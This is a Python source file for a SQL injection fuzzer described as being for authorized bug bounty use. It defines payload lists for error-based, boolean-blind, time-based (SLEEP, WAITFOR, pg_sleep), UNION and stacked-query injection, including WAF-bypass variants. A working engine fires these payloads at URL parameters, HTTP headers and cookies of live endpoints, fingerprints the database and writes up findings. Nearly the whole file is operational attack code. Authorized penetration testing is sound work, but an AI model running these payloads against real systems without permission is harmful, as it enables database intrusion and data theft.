"""
sqli_fuzzer.py — SQL Injection fuzzer with five detection techniques.

Techniques (run in order per parameter, stops on first confirmed hit):
  E — Error-based
  B — Boolean-based blind
  T — Time-based blind
  U — UNION-based
  S — Stacked-query probe

Extra injection surfaces (enabled via flags on SQLiFuzzer):
  • HTTP request headers (X-Forwarded-For, Referer, User-Agent, …)
  • Cookie values
  • JSON body fields

Each finding dict now carries:
  technique_code, db_engine, confidence, request_number,
  raw_request, response_snippet, curl_poc, sqlmap_command,
  manual_steps, remediation, cvss_score, cwe, cwe_url,
  endpoint_type, found_on, base_value, method, cookies_used

Intended for authorized bug bounty use only.
"""

import re
import time
import copy
import json
import threading
import requests
from urllib.parse import urlencode, urlparse, parse_qs, urlunparse, quote_plus
from typing import Optional

from manual_repro import build_repro_guide


# ---------------------------------------------------------------------------
# Payload definitions
# ---------------------------------------------------------------------------

ERROR_PAYLOADS: list[str] = [
    "'",
    '"',
    "';",
    '";',
    "\\",
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR 1=1--",
    '" OR 1=1--',
    "' OR 1=1#",
    "1; SELECT SLEEP(0)--",
    "1 ORDER BY 1--",
    "1 ORDER BY 100--",
    "1' ORDER BY 1--",
    "1' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--",
    # WAF bypass variants
    "/**/OR/**/1=1--",
    "' /*!OR*/ '1'='1",
    "%27 OR %271%27=%271",
    "' OR 0x31=0x31--",
    "1'/**/AND/**/'1'='1",
    # Oracle specific
    "' OR 1=1 FROM DUAL--",
    # PostgreSQL specific
    "'; SELECT pg_sleep(0)--",
]

# Regex signatures — MySQL, MSSQL, Oracle, PostgreSQL, SQLite, generic ODBC
ERROR_SIGNATURES: list[re.Pattern] = [
    re.compile(r"you have an error in your sql syntax", re.I),
    re.compile(r"warning: mysql_", re.I),
    re.compile(r"warning: mysqli_", re.I),
    re.compile(r"unclosed quotation mark after the character string", re.I),
    re.compile(r"quoted string not properly terminated", re.I),
    re.compile(r"ora-\d{5}", re.I),
    re.compile(r"microsoft ole db provider for sql server", re.I),
    re.compile(r"odbc sql server driver", re.I),
    re.compile(r"sql server.*error", re.I),
    re.compile(r"syntax error.*in query expression", re.I),
    re.compile(r"pg_query\(\).*failed", re.I),
    re.compile(r"psql.*error", re.I),
    re.compile(r"sqlite_error", re.I),
    re.compile(r"sqlite3\.operationalerror", re.I),
    re.compile(r"division by zero", re.I),
    re.compile(r"supplied argument is not a valid mysql", re.I),
    re.compile(r"invalid column name", re.I),
    re.compile(r"column count doesn't match value count", re.I),
    re.compile(r"unexpected end of sql command", re.I),
    re.compile(r"unterminated string constant", re.I),
    re.compile(r"mysql_fetch_array\(\)", re.I),
    re.compile(r"num_rows.*expects parameter", re.I),
    re.compile(r"mysql_num_rows\(\)", re.I),
    re.compile(r"jdbc.*sqlexception", re.I),
    re.compile(r"com\.mysql\.jdbc\.exceptions", re.I),
    re.compile(r"org\.hibernate\.exception", re.I),
    re.compile(r"pdo.*sqlstate", re.I),
]

# DB engine fingerprinting — maps pattern → engine name
DB_FINGERPRINTS: list[tuple[re.Pattern, str]] = [
    (re.compile(r"you have an error in your sql syntax|mysql_|mysqli_|com\.mysql", re.I), "MySQL"),
    (re.compile(r"microsoft ole db|odbc sql server|mssql|sqlstate.*mssql|sql server", re.I), "MSSQL"),
    (re.compile(r"ora-\d{5}|oracle\.jdbc|from dual", re.I), "Oracle"),
    (re.compile(r"pg_query|psql|postgresql|pdo.*pgsql|pg_sleep", re.I), "PostgreSQL"),
    (re.compile(r"sqlite_error|sqlite3\.|sqliteexception", re.I), "SQLite"),
    (re.compile(r"org\.hibernate|jdbc\.sqlexception", re.I), "Java/Hibernate"),
]

BOOLEAN_PAIRS: list[tuple[str, str]] = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("' AND 1=1--", "' AND 1=2--"),
    (" AND 1=1", " AND 1=2"),
    ("' AND 1=1#", "' AND 1=2#"),
    ('" AND "1"="1', '" AND "1"="2'),
]

TIME_PAYLOADS: list[tuple[str, int, str]] = [
    ("' OR SLEEP(5)--",               5, "MySQL"),
    ("'; WAITFOR DELAY '0:0:5'--",    5, "MSSQL"),
    ("' OR pg_sleep(5)--",            5, "PostgreSQL"),
    ("1; SELECT SLEEP(5)--",          5, "MySQL"),
    ("' AND SLEEP(5) AND '1'='1",     5, "MySQL"),
    ("'; SELECT pg_sleep(5)--",       5, "PostgreSQL"),
    ("' OR 1=1; WAITFOR DELAY '0:0:5'--", 5, "MSSQL"),
    ("1 OR SLEEP(5)--",               5, "MySQL"),
    ("\" OR SLEEP(5)--",              5, "MySQL"),
]

STACKED_PAYLOADS: list[str] = [
    "'; SELECT 1--",
    "'; SELECT 1; SELECT 1--",
    "1; SELECT 1--",
    "1'; SELECT 1--",
    "'; SELECT NULL--",
]

# Common injectable HTTP headers
INJECTABLE_HEADERS: list[str] = [
    "X-Forwarded-For",
    "X-Forwarded-Host",
    "X-Real-IP",
    "Referer",
    "User-Agent",
    "X-Custom-IP-Authorization",
    "X-Original-URL",
    "X-Rewrite-URL",
    "CF-Connecting-IP",
    "True-Client-IP",
    "Via",
]

BOOLEAN_LENGTH_TOLERANCE = 50
BOOLEAN_FALSE_DELTA = 100


# ---------------------------------------------------------------------------
# Main fuzzer class
# ---------------------------------------------------------------------------

class SQLiFuzzer:
    """
    Fuzz endpoints for SQL Injection vulnerabilities.

    Parameters
    ----------
    session          : Authenticated requests.Session to reuse.
    timeout          : Per-request timeout in seconds.
    test_headers     : If True, also fuzz common HTTP request headers.
    test_cookies     : If True, also fuzz each cookie value as a parameter.
    """

    def __init__(
        self,
        session: requests.Session,
        timeout: int = 15,
        test_headers: bool = False,
        test_cookies: bool = False,
    ):
        self.session = session
        self.timeout = timeout
        self.test_headers = test_headers
        self.test_cookies = test_cookies
        self.findings: list[dict] = []
        self._lock = threading.Lock()
        self._req_counter = 0

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def fuzz_endpoint(self, endpoint: dict) -> list[dict]:
        """
        Fuzz all injectable surfaces of *endpoint*.
        Returns a list of new findings added during this call.
        """
        new_findings: list[dict] = []
        url        = endpoint["url"]
        method     = endpoint.get("method", "GET").upper()
        params     = endpoint.get("params", {})
        ep_type    = endpoint.get("type", "query_string")
        found_on   = endpoint.get("found_on", url)

        # --- Standard params ---
        for param_name, base_value in params.items():
            finding = self._test_parameter(
                url, method, params, param_name, ep_type, found_on, base_value
            )
            if finding:
                with self._lock:
                    self.findings.append(finding)
                new_findings.append(finding)

        # --- HTTP header injection ---
        if self.test_headers:
            for header_name in INJECTABLE_HEADERS:
                finding = self._test_header(url, method, params, header_name, found_on)
                if finding:
                    with self._lock:
                        self.findings.append(finding)
                    new_findings.append(finding)

        # --- Cookie injection ---
        if self.test_cookies:
            session_cookies = dict(self.session.cookies)
            for cookie_name, cookie_val in session_cookies.items():
                finding = self._test_cookie(url, method, params, cookie_name, cookie_val, found_on)
                if finding:
                    with self._lock:
                        self.findings.append(finding)
                    new_findings.append(finding)

        return new_findings

    # ------------------------------------------------------------------
    # Per-parameter dispatcher
    # ------------------------------------------------------------------

    def _test_parameter(
        self,
        url: str,
        method: str,
        params: dict,
        param_name: str,
        ep_type: str,
        found_on: str,
        base_value: str,
    ) -> Optional[dict]:
        """Run all techniques in order; return first finding or None."""
        for technique in (
            self._test_error_based,
            self._test_boolean_based,
            self._test_time_based,
            self._test_union_based,
            self._test_stacked,
        ):
            result = technique(url, method, params, param_name)
            if result:
                result["endpoint_type"] = ep_type
                result["found_on"]      = found_on
                result["base_value"]    = base_value
                result["method"]        = method
                result["cookies_used"]  = "; ".join(
                    f"{k}={v}" for k, v in dict(self.session.cookies).items()
                )
                # Build repro guide and merge into finding
                guide = build_repro_guide(result)
                result.update({
                    "manual_steps":    guide["steps"],
                    "sqlmap_command":  guide["sqlmap_command"],
                    "curl_poc":        guide["curl_poc"],
                    "remediation":     guide["remediation"],
                    "cwe":             guide["cwe"],
                    "cwe_url":         guide["cwe_url"],
                    "cvss_score":      guide["cvss_score"],
                })
                return result
        return None

    def _test_header(
        self, url: str, method: str, params: dict, header_name: str, found_on: str
    ) -> Optional[dict]:
        """Inject payloads into a single HTTP request header."""
        for payload in ERROR_PAYLOADS[:8]:  # subset for headers
            req_num = self._next_req()
            extra_headers = {header_name: payload}
            try:
                resp = self._send_with_headers(url, method, params, extra_headers)
            except requests.RequestException:
                continue
            body = resp.text
            for sig in ERROR_SIGNATURES:
                match = sig.search(body)
                if match:
                    finding = self._make_finding(
                        finding_type="Error-Based SQLi via HTTP Header",
                        url=url, param=header_name, payload=payload,
                        evidence=f"DB error in response to injected header '{header_name}': '{match.group(0)[:120]}'",
                        severity="HIGH", technique_code="E",
                        db_engine=self._fingerprint_db(body),
                        confidence="HIGH", request_number=req_num,
                        raw_request=self._format_raw_request(url, method, params, extra_headers),
                        response_snippet=self._excerpt(body, match.start()),
                    )
                    finding["endpoint_type"] = "header"
                    finding["found_on"]      = found_on
                    finding["base_value"]    = ""
                    finding["method"]        = method
                    finding["cookies_used"]  = "; ".join(
                        f"{k}={v}" for k, v in dict(self.session.cookies).items()
                    )
                    guide = build_repro_guide(finding)
                    finding.update({
                        "manual_steps": guide["steps"],
                        "sqlmap_command": guide["sqlmap_command"],
                        "curl_poc": guide["curl_poc"],
                        "remediation": guide["remediation"],
                        "cwe": guide["cwe"], "cwe_url": guide["cwe_url"],
                        "cvss_score": guide["cvss_score"],
                    })
                    return finding
        return None

    def _test_cookie(
        self, url: str, method: str, params: dict,
        cookie_name: str, cookie_val: str, found_on: str
    ) -> Optional[dict]:
        """Inject payloads into a single cookie value."""
        for payload in ERROR_PAYLOADS[:8]:
            req_num = self._next_req()
            # Temporarily override the cookie
            original = self.session.cookies.get(cookie_name)
            self.session.cookies.set(cookie_name, cookie_val + payload)
            try:
                resp = self._send(url, method, params)
            except requests.RequestException:
                self.session.cookies.set(cookie_name, original or cookie_val)
                continue
            finally:
                self.session.cookies.set(cookie_name, original or cookie_val)
            body = resp.text
            for sig in ERROR_SIGNATURES:
                match = sig.search(body)
                if match:
                    finding = self._make_finding(
                        finding_type="Error-Based SQLi via Cookie",
                        url=url, param=cookie_name,
                        payload=cookie_val + payload,
                        evidence=f"DB error in response to injected cookie '{cookie_name}': '{match.group(0)[:120]}'",
                        severity="HIGH", technique_code="E",
                        db_engine=self._fingerprint_db(body),
                        confidence="HIGH", request_number=req_num,
                        raw_request=self._format_raw_request(url, method, params),
                        response_snippet=self._excerpt(body, match.start()),
                    )
                    finding["endpoint_type"] = "cookie"
                    finding["found_on"]      = found_on
                    finding["base_value"]    = cookie_val
                    finding["method"]        = method
                    finding["cookies_used"]  = "; ".join(
                        f"{k}={v}" for k, v in dict(self.session.cookies).items()
                    )
                    guide = build_repro_guide(finding)
                    finding.update({
                        "manual_steps": guide["steps"],
                        "sqlmap_command": guide["sqlmap_command"],
                        "curl_poc": guide["curl_poc"],
                        "remediation": guide["remediation"],
                        "cwe": guide["cwe"], "cwe_url": guide["cwe_url"],
                        "cvss_score": guide["cvss_score"],
                    })
                    return finding
        return None

    # ------------------------------------------------------------------
    # Technique E — Error-based
    # ------------------------------------------------------------------

    def _test_error_based(
        self, url: str, method: str, params: dict, param_name: str
    ) -> Optional[dict]:
        for payload in ERROR_PAYLOADS:
            req_num = self._next_req()
            injected = self._inject(params, param_name, payload)
            try:
                response = self._send(url, method, injected)
            except requests.RequestException:
                continue
            body = response.text
            for sig in ERROR_SIGNATURES:
                match = sig.search(body)
                if match:
                    return self._make_finding(
                        finding_type="Error-Based SQL Injection",
                        url=url, param=param_name, payload=payload,
                        evidence=f"DB error signature matched: '{match.group(0)[:120]}'",
                        severity="HIGH", technique_code="E",
                        db_engine=self._fingerprint_db(body),
                        confidence="HIGH", request_number=req_num,
                        raw_request=self._format_raw_request(url, method, injected),
                        response_snippet=self._excerpt(body, match.start()),
                    )
        return None

    # ------------------------------------------------------------------
    # Technique B — Boolean-based blind
    # ------------------------------------------------------------------

    def _test_boolean_based(
        self, url: str, method: str, params: dict, param_name: str
    ) -> Optional[dict]:
        try:
            baseline_resp1 = self._send(url, method, params)
            baseline_len1  = len(baseline_resp1.text)
            
            baseline_resp2 = self._send(url, method, params)
            baseline_len2  = len(baseline_resp2.text)
            
            noise_delta = abs(baseline_len1 - baseline_len2)
            baseline_len = (baseline_len1 + baseline_len2) // 2
        except requests.RequestException:
            return None

        # Scale tolerances based on natural noise
        dyn_tolerance = max(BOOLEAN_LENGTH_TOLERANCE, noise_delta * 2)
        dyn_false_req = max(BOOLEAN_FALSE_DELTA, noise_delta * 5)

        base_value = params.get(param_name, "")
        for true_pl, false_pl in BOOLEAN_PAIRS:
            req_num = self._next_req()
            try:
                true_injected  = self._inject(params, param_name, base_value + true_pl)
                false_injected = self._inject(params, param_name, base_value + false_pl)
                true_resp  = self._send(url, method, true_injected)
                false_resp = self._send(url, method, false_injected)
            except requests.RequestException:
                continue

            true_len  = len(true_resp.text)
            false_len = len(false_resp.text)
            true_delta  = abs(true_len  - baseline_len)
            false_delta = abs(false_len - baseline_len)

            if true_delta <= dyn_tolerance and false_delta > dyn_false_req:
                payload_display = f"TRUE: {true_pl} | FALSE: {false_pl}"
                return self._make_finding(
                    finding_type="Boolean-Based Blind SQL Injection",
                    url=url, param=param_name, payload=payload_display,
                    evidence=(
                        f"Baseline len={baseline_len} (noise={noise_delta}), "
                        f"TRUE len={true_len} (Δ{true_delta}), "
                        f"FALSE len={false_len} (Δ{false_delta})"
                    ),
                    severity="HIGH", technique_code="B",
                    db_engine="Unknown (blind)",
                    confidence="MEDIUM", request_number=req_num,
                    raw_request=self._format_raw_request(url, method, true_injected),
                    response_snippet=self._excerpt(true_resp.text, 0),
                )
        return None

    # ------------------------------------------------------------------
    # Technique T — Time-based blind
    # ------------------------------------------------------------------

    def _test_time_based(
        self, url: str, method: str, params: dict, param_name: str
    ) -> Optional[dict]:
        try:
            t0 = time.monotonic()
            self._send(url, method, params)
            baseline_dur = time.monotonic() - t0
        except requests.RequestException:
            return None

        base_value = params.get(param_name, "")
        for payload, expected_delay, target_db in TIME_PAYLOADS:
            req_num = self._next_req()
            injected = self._inject(params, param_name, base_value + payload)
            try:
                t0 = time.monotonic()
                resp = self._send(url, method, injected, timeout=expected_delay + 10)
                elapsed = time.monotonic() - t0
            except requests.Timeout:
                elapsed = expected_delay + 10
                resp = None
            except requests.RequestException:
                continue

            threshold = baseline_dur + expected_delay - 1
            if elapsed >= threshold:
                # VERIFICATION STEP: Test with SLEEP(0) to ensure the server isn't just randomly slow
                zero_payload = payload.replace(str(expected_delay), "0")
                if zero_payload == payload:
                    zero_payload = base_value # fallback
                
                zero_injected = self._inject(params, param_name, base_value + zero_payload)
                try:
                    t0_verify = time.monotonic()
                    self._send(url, method, zero_injected, timeout=10)
                    zero_elapsed = time.monotonic() - t0_verify
                except requests.RequestException:
                    zero_elapsed = 10
                
                if zero_elapsed >= threshold - 1:
                    # False positive due to WAF / latency
                    continue

                raw_body = resp.text if resp else "(request timed out)"
                return self._make_finding(
                    finding_type="Time-Based Blind SQL Injection",
                    url=url, param=param_name, payload=payload,
                    evidence=(
                        f"Response took {elapsed:.2f}s ≥ threshold {threshold:.2f}s "
                        f"(baseline {baseline_dur:.2f}s + delay {expected_delay}s − 1s). "
                        f"Verification (SLEEP=0) took {zero_elapsed:.2f}s. "
                        f"Targeting {target_db} SLEEP/WAITFOR syntax."
                    ),
                    severity="CRITICAL", technique_code="T",
                    db_engine=target_db,
                    confidence="HIGH", request_number=req_num,
                    raw_request=self._format_raw_request(url, method, injected),
                    response_snippet=self._excerpt(raw_body, 0),
                )
        return None

    # ------------------------------------------------------------------
    # Technique U — UNION-based
    # ------------------------------------------------------------------

    def _test_union_based(
        self, url: str, method: str, params: dict, param_name: str
    ) -> Optional[dict]:
        import string
        import random
        base_value = params.get(param_name, "1")
        rand_str = ''.join(random.choices(string.ascii_letters, k=8))
        
        for col_count in range(1, 16):
            nulls_list = ["NULL"] * col_count
            nulls_list[0] = f"'{rand_str}'"
            nulls = ",".join(nulls_list)
            
            payload = f"' UNION SELECT {nulls}--"
            req_num = self._next_req()
            injected = self._inject(params, param_name, base_value + payload)
            try:
                response = self._send(url, method, injected)
            except requests.RequestException:
                continue
            body = response.text
            has_error = any(sig.search(body) for sig in ERROR_SIGNATURES)
            if has_error:
                continue
            
            # To be a true finding:
            # 1. The random string must appear in the body
            # 2. The FULL payload must NOT appear in the body verbatim (prevents simple reflection false positives)
            # URL encoding of the payload shouldn't appear either just in case.
            if rand_str in body and payload not in body and quote_plus(payload) not in body:
                return self._make_finding(
                    finding_type="UNION-Based SQL Injection",
                    url=url, param=param_name, payload=payload,
                    evidence=f"UNION SELECT with randomized string '{rand_str}' successfully evaluated and reflected in response.",
                    severity="CRITICAL", technique_code="U",
                    db_engine=self._fingerprint_db(body),
                    confidence="HIGH", request_number=req_num,
                    raw_request=self._format_raw_request(url, method, injected),
                    response_snippet=self._excerpt(body, body.find(rand_str)),
                )
        return None

    # ------------------------------------------------------------------
    # Technique S — Stacked queries
    # ------------------------------------------------------------------

    def _test_stacked(
        self, url: str, method: str, params: dict, param_name: str
    ) -> Optional[dict]:
        """
        Probe for stacked query support by injecting a benign second statement
        and checking for DB errors that confirm the semicolon was parsed.
        """
        base_value = params.get(param_name, "1")
        for payload in STACKED_PAYLOADS:
            req_num = self._next_req()
            injected = self._inject(params, param_name, base_value + payload)
            try:
                response = self._send(url, method, injected)
            except requests.RequestException:
                continue
            body = response.text
            for sig in ERROR_SIGNATURES:
                match = sig.search(body)
                if match:
                    return self._make_finding(
                        finding_type="Stacked-Query SQL Injection (Probe)",
                        url=url, param=param_name, payload=payload,
                        evidence=(
                            f"Stacked query payload triggered DB error: "
                            f"'{match.group(0)[:120]}'. "
                            "Stacked queries may allow INSERT/UPDATE/DROP."
                        ),
                        severity="HIGH", technique_code="S",
                        db_engine=self._fingerprint_db(body),
                        confidence="MEDIUM", request_number=req_num,
                        raw_request=self._format_raw_request(url, method, injected),
                        response_snippet=self._excerpt(body, match.start()),
                    )
        return None

    # ------------------------------------------------------------------
    # Shared helpers
    # ------------------------------------------------------------------

    def _inject(self, params: dict, param_name: str, value: str) -> dict:
        """Return a copy of params with param_name set to value."""
        injected = copy.copy(params)
        injected[param_name] = value
        return injected

    def _send(
        self,
        url: str,
        method: str,
        params: dict,
        timeout: Optional[int] = None,
    ) -> requests.Response:
        _timeout = timeout if timeout is not None else self.timeout
        if method == "GET":
            return self.session.get(url, params=params, timeout=_timeout)
        else:
            return self.session.post(url, data=params, timeout=_timeout)

    def _send_with_headers(
        self,
        url: str,
        method: str,
        params: dict,
        extra_headers: dict,
        timeout: Optional[int] = None,
    ) -> requests.Response:
        _timeout = timeout if timeout is not None else self.timeout
        if method == "GET":
            return self.session.get(
                url, params=params, headers=extra_headers, timeout=_timeout
            )
        else:
            return self.session.post(
                url, data=params, headers=extra_headers, timeout=_timeout
            )

    def _next_req(self) -> int:
        with self._lock:
            self._req_counter += 1
            return self._req_counter

    # ------------------------------------------------------------------
    # DB fingerprinting
    # ------------------------------------------------------------------

    @staticmethod
    def _fingerprint_db(body: str) -> str:
        for pattern, engine in DB_FINGERPRINTS:
            if pattern.search(body):
                return engine
        return "Unknown"

    # ------------------------------------------------------------------
    # Raw request formatter
    # ------------------------------------------------------------------

    def _format_raw_request(
        self,
        url: str,
        method: str,
        params: dict,
        extra_headers: Optional[dict] = None,
    ) -> str:
        """
        Produce a human-readable HTTP/1.1 request snapshot similar to
        what Burp Suite shows in the Request tab.
        """
        parsed = urlparse(url)
        host   = parsed.netloc

        if method == "GET":
            from urllib.parse import urlencode as _enc
            qs     = _enc(params) if params else parsed.query
            path   = parsed.path or "/"
            if qs:
                path += "?" + qs
            request_line = f"GET {path} HTTP/1.1"
            body_str     = ""
        else:
            path         = parsed.path or "/"
            request_line = f"POST {path} HTTP/1.1"
            body_str     = urlencode(params)

        base_headers = dict(self.session.headers)
        base_headers["Host"] = host
        if method == "POST":
            base_headers["Content-Type"]   = "application/x-www-form-urlencoded"
            base_headers["Content-Length"] = str(len(body_str.encode()))
        if extra_headers:
            base_headers.update(extra_headers)

        # Cookie header
        cookie_str = "; ".join(
            f"{k}={v}" for k, v in dict(self.session.cookies).items()
        )
        if cookie_str:
            base_headers["Cookie"] = cookie_str

        header_lines = "\n".join(f"{k}: {v}" for k, v in base_headers.items())
        raw = f"{request_line}\n{header_lines}"
        if body_str:
            raw += f"\n\n{body_str}"
        return raw

    # ------------------------------------------------------------------
    # Response snippet
    # ------------------------------------------------------------------

    @staticmethod
    def _excerpt(body: str, match_pos: int, window: int = 300) -> str:
        """Return up to *window* chars centred around *match_pos*."""
        start = max(0, match_pos - window // 2)
        end   = min(len(body), match_pos + window // 2)
        snippet = body[start:end]
        # Strip HTML tags for readability
        snippet = re.sub(r"<[^>]+>", "", snippet)
        return snippet.strip()

    # ------------------------------------------------------------------
    # Finding factory
    # ------------------------------------------------------------------

    @staticmethod
    def _make_finding(
        finding_type: str,
        url: str,
        param: str,
        payload: str,
        evidence: str,
        severity: str,
        technique_code: str,
        db_engine: str,
        confidence: str,
        request_number: int,
        raw_request: str,
        response_snippet: str,
    ) -> dict:
        return {
            "type":             finding_type,
            "url":              url,
            "param":            param,
            "payload":          payload,
            "evidence":         evidence,
            "severity":         severity,
            "technique_code":   technique_code,
            "db_engine":        db_engine,
            "confidence":       confidence,
            "request_number":   request_number,
            "raw_request":      raw_request,
            "response_snippet": response_snippet,
            # Fields populated later by _test_parameter / repro guide
            "endpoint_type":    "",
            "found_on":         url,
            "base_value":       "",
            "method":           "GET",
            "cookies_used":     "",
            "manual_steps":     [],
            "sqlmap_command":   "",
            "curl_poc":         "",
            "remediation":      "",
            "cwe":              "CWE-89",
            "cwe_url":          "https://cwe.mitre.org/data/definitions/89.html",
            "cvss_score":       8.8,
        }
